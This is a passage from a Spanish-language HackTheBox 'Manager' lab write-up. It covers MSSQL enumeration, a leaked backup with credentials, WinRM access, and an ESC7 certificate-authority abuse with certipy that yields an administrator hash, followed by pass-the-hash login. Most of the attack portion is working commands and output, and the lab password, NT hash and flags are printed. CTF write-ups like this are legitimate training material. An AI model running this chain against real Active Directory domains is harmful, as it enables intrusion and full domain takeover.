+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> SELECT name FROM sys.databases
+name
+<span class="nt">------</span>
+master
+
+tempdb
+
+model
+
+msdb
+
+SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora enumeramos las tablas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> SELECT <span class="k">*</span> FROM sys.tables
+name                object_id   principal_id   schema_id   parent_object_id   <span class="nb">type   </span>type_desc    create_date   modify_date   is_ms_shipped   is_published   is_schema_published   lob_data_space_id   filestream_data_space_id   max_column_id_used   lock_on_bulk_load   uses_ansi_nulls   is_replicated   has_replication_filter   is_merge_published   is_sync_tran_subscribed   has_unchecked_assembly_data   text_in_row_limit   large_value_types_out_of_row   is_tracked_by_cdc   lock_escalation   lock_escalation_desc   is_filetable   is_memory_optimized   durability   durability_desc   temporal_type   temporal_type_desc   history_table_id   is_remote_data_archive_enabled   is_external   history_retention_period   history_retention_period_unit   history_retention_period_unit_desc   is_node   is_edge
+<span class="nt">----------------</span>   <span class="nt">----------</span>   <span class="nt">------------</span>   <span class="nt">---------</span>   <span class="nt">----------------</span>   <span class="nt">----</span>   <span class="nt">----------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>   <span class="nt">-------------</span>   <span class="nt">------------</span>   <span class="nt">-------------------</span>   <span class="nt">-----------------</span>   <span class="nt">------------------------</span>   <span class="nt">------------------</span>   <span class="nt">-----------------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>   <span class="nt">----------------------</span>   <span class="nt">------------------</span>   <span class="nt">-----------------------</span>   <span class="nt">---------------------------</span>   <span class="nt">-----------------</span>   <span class="nt">----------------------------</span>   <span class="nt">-----------------</span>   <span class="nt">---------------</span>   <span class="nt">--------------------</span>   <span class="nt">------------</span>   <span class="nt">-------------------</span>   <span class="nt">----------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>   <span class="nt">------------------</span>   <span class="nt">----------------</span>   <span class="nt">------------------------------</span>   <span class="nt">-----------</span>   <span class="nt">------------------------</span>   <span class="nt">-----------------------------</span>   <span class="nt">----------------------------------</span>   <span class="nt">-------</span>   <span class="nt">-------</span>
+spt_fallback_db     117575457           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2003-04-08 09:18:01   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    8                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+spt_fallback_dev    133575514           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2003-04-08 09:18:02   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   10                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+spt_fallback_usg    149575571           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2003-04-08 09:18:04   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    9                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+spt_monitor        1803153469           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2019-09-24 14:21:40   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   11                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0
+
+SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Pero nada importante.</p>
+  </li>
+  <li>
+    <p>No tenemos permiso de habilitar el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> enable_xp_cmdshell
+<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 105: User does not have permission to perform this action.
+<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
+<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
+<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
+SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a enumerar <strong>files</strong> con <strong>xp_dirtree</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> xp_dirtree C:<span class="se">\</span>
+subdirectory                depth   file
+<span class="nt">-------------------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
+<span class="nv">$Recycle</span>.Bin                    1      0
+
+Documents and Settings          1      0
+
+inetpub                         1      0
+
+PerfLogs                        1      0
+
+Program Files                   1      0
+
+Program Files <span class="o">(</span>x86<span class="o">)</span>             1      0
+
+ProgramData                     1      0
+
+Recovery                        1      0
+
+SQL2019                         1      0
+
+System Volume Information       1      0
+
+Users                           1      0
+
+Windows                         1      0
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno encontramos directorio interesante donde encontramos un <strong>.zip</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> xp_dirtree C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
+subdirectory                      depth   file
+<span class="nt">-------------------------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
+about.html                            1      1
+
+contact.html                          1      1
+
+css                                   1      0
+
+images                                1      0
+
+index.html                            1      1
+
+js                                    1      0
+
+service.html                          1      1
+
+web.config                            1      1
+
+website-backup-27-07-23-old.zip       1      1
+
+SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<h1 id="zip">Zip</h1>
+
+<ul>
+  <li>Vamos a descargar el comprimido fácilmente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content wget http://10.10.11.236/website-backup-27-07-23-old.zip
+<span class="nt">--2024-03-16</span> 12:30:07--  http://10.10.11.236/website-backup-27-07-23-old.zip
+Connecting to 10.10.11.236:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1045328 <span class="o">(</span>1021K<span class="o">)</span> <span class="o">[</span>application/x-zip-compressed]
+Saving to: ‘website-backup-27-07-23-old.zip’
+
+website-backup-27-07-23-old.zip      100%[<span class="o">=====================================================================&gt;]</span>   1021K   933KB/s    <span class="k">in </span>1.1s
+
+2024-03-16 12:30:08 <span class="o">(</span>933 KB/s<span class="o">)</span> - ‘website-backup-27-07-23-old.zip’ saved <span class="o">[</span>1045328/1045328]
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a descomprimirlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip website-backup-27-07-23-old.zip
+Archive:  website-backup-27-07-23-old.zip
+  inflating: .old-conf.xml
+  inflating: about.html
+  inflating: contact.html
+  inflating: css/bootstrap.css
+  inflating: css/responsive.css
+  inflating: css/style.css
+  inflating: css/style.css.map
+  inflating: css/style.scss
+  inflating: images/about-img.png
+  inflating: images/body_bg.jpg
+ extracting: images/call.png
+ extracting: images/call-o.png
+  inflating: images/client.jpg
+  inflating: images/contact-img.jpg
+ extracting: images/envelope.png
+ extracting: images/envelope-o.png
+  inflating: images/hero-bg.jpg
+ extracting: images/location.png
+ extracting: images/location-o.png
+ extracting: images/logo.png
+  inflating: images/menu.png
+ extracting: images/next.png
+ extracting: images/next-white.png
+  inflating: images/offer-img.jpg
+  inflating: images/prev.png
+ extracting: images/prev-white.png
+ extracting: images/quote.png
+ extracting: images/s-1.png
+ extracting: images/s-2.png
+ extracting: images/s-3.png
+ extracting: images/s-4.png
+ extracting: images/search-icon.png
+  inflating: index.html
+  inflating: js/bootstrap.js
+  inflating: js/jquery-3.4.1.min.js
+  inflating: service.html
+➜  content
+</code></pre></div></div>
+
+<h2 id="shell-as-raven">Shell as raven</h2>
+
+<ul>
+  <li>Si examinamos el archivo <strong>old-conf.xml</strong> encontramos credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> .old-conf.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;ldap-conf xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="o">&gt;</span>
+   &lt;server&gt;
+      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
+      &lt;open-port <span class="nv">enabled</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;</span>389&lt;/open-port&gt;
+      &lt;secure-port <span class="nv">enabled</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>0&lt;/secure-port&gt;
+      &lt;search-base&gt;dc<span class="o">=</span>manager,dc<span class="o">=</span>htb&lt;/search-base&gt;
+      &lt;server-type&gt;microsoft&lt;/server-type&gt;
+      &lt;access-user&gt;
+         &lt;user&gt;raven@manager.htb&lt;/user&gt;
+         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
+      &lt;/access-user&gt;
+      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
+   &lt;/server&gt;
+   &lt;search <span class="nb">type</span><span class="o">=</span><span class="s2">"full"</span><span class="o">&gt;</span>
+      &lt;dir-list&gt;
+         &lt;<span class="nb">dir</span><span class="o">&gt;</span><span class="nv">cn</span><span class="o">=</span>Operator1,CN<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>manager,dc<span class="o">=</span>htb&lt;/dir&gt;
+      &lt;/dir-list&gt;
+   &lt;/search&gt;
+&lt;/ldap-conf&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a corroborar si podemos conectarnos con <strong>evil-winrm</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.11.236 <span class="nt">-u</span> raven <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+SMB         10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span>
+HTTP        10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             <span class="o">[</span>+] manager.htb<span class="se">\r</span>aven:R4v3nBe5tD3veloP3r!123 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Nos conectamos y podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.11.236 <span class="nt">-u</span> raven <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+192acfae62cbf1f9d9db96f43db90f99
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>No podemos hacer gran cosa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a verificar los <strong>Advice Directory Certificate Services</strong> con la herramienta .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad find <span class="nt">-dc-ip</span> 10.10.11.236 <span class="nt">-ns</span> 10.10.11.236 <span class="nt">-u</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="nt">-vulnerable</span> <span class="nt">-stdout</span>
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 33 certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 11 enabled certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'manager-DC01-CA'</span> via CSRA
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'manager-DC01-CA'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : manager-DC01-CA
+    DNS Name                            : dc01.manager.htb
+    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>manager-DC01-CA, <span class="nv">DC</span><span class="o">=</span>manager, <span class="nv">DC</span><span class="o">=</span>htb
+    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption <span class="k">for </span>Requests     : Enabled
+    Permissions
+      Owner                             : MANAGER.HTB<span class="se">\A</span>dministrators
+      Access Rights
+        Enroll                          : MANAGER.HTB<span class="se">\O</span>perator
+                                          MANAGER.HTB<span class="se">\A</span>uthenticated Users
+                                          MANAGER.HTB<span class="se">\R</span>aven
+        ManageCa                        : MANAGER.HTB<span class="se">\A</span>dministrators
+                                          MANAGER.HTB<span class="se">\D</span>omain Admins
+                                          MANAGER.HTB<span class="se">\E</span>nterprise Admins
+                                          MANAGER.HTB<span class="se">\R</span>aven
+        ManageCertificates              : MANAGER.HTB<span class="se">\A</span>dministrators
+                                          MANAGER.HTB<span class="se">\D</span>omain Admins
+                                          MANAGER.HTB<span class="se">\E</span>nterprise Admins
+    <span class="o">[!]</span> Vulnerabilities
+      ESC7                              : <span class="s1">'MANAGER.HTB\\Raven'</span> has dangerous permissions
+Certificate Templates                   : <span class="o">[!]</span> Could not find any certificate templates
+</code></pre></div></div>
+
+<h2 id="esc7">ESC7</h2>
+
+<ul>
+  <li>
+    <p>Y bueno ya nos reporta que es vulnerable a <strong>ESC7</strong> esta vulnerabilidad se produce cuando un usuario tiene derechos de acceso elevados sobre el propio servicio de Certificate Authority (CA) o sobre la administración de certificados. En este caso específico, el usuario “Raven” tiene derechos de “ManageCA” (Administrar CA) .</p>
+  </li>
+  <li>
+    <p>Lo primero que vamos a hacer es sincronizarnos con el reloj del dominio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>ntpdate <span class="nt">-u</span> manager.htb
+2024-03-16 19:52:19.262396 <span class="o">(</span><span class="nt">-0600</span><span class="o">)</span> +25200.544784 +/- 0.076829 manager.htb 10.10.11.236 s1 no-leap
+CLOCK: <span class="nb">time </span>stepped by 25200.544784
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a usar <strong>certipy</strong> necesitamos usar el <strong>Manage CA permission</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad ca <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-add-officer</span> raven <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a solicitar un certificado, falla, pero tenemos la clave.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad req <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-target</span> dc01.manager.htb <span class="nt">-template</span> SubCA <span class="nt">-upn</span> administrator@manager.htb <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+<span class="o">[</span>-] Got error <span class="k">while </span>trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class="k">do </span>not allow the current user to enroll <span class="k">for </span>this <span class="nb">type </span>of certificate.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 18
+Would you like to save the private key? <span class="o">(</span>y/N<span class="o">)</span> y
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved private key to 18.key
+<span class="o">[</span>-] Failed to request certificate
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a emitir un certificado apartar de la solicitud previamente generada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad ca <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-issue-request</span> 18 <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully issued certificate
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a recuperar el certificado emitido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad req <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-target</span> dc01.manager.htb <span class="nt">-retrieve</span> 18 <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Rerieving certificate with ID 18
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully retrieved certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with UPN <span class="s1">'administrator@manager.htb'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded private key from <span class="s1">'18.key'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator.pfx'</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+
+<ul>
+  <li>Ahora con este certificado podemos obtener el hash <strong>NTLM</strong> del usuario administrador para esto es muy importante que tu reloj esté previamente sincronizado con la máquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.10.11.236
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@manager.htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@manager.htb'</span>: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos conectamos ala máquina como administrador.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.11.236 <span class="nt">-u</span> administrator <span class="nt">-H</span> ae5064c2f62317332c88629e025924ef
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>manager<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="roottxt">root.txt</h2>
+
+<ul>
+  <li>Vemos la root flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+b6a4acc041a47c288ef5c9a5f085678e
 </code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>
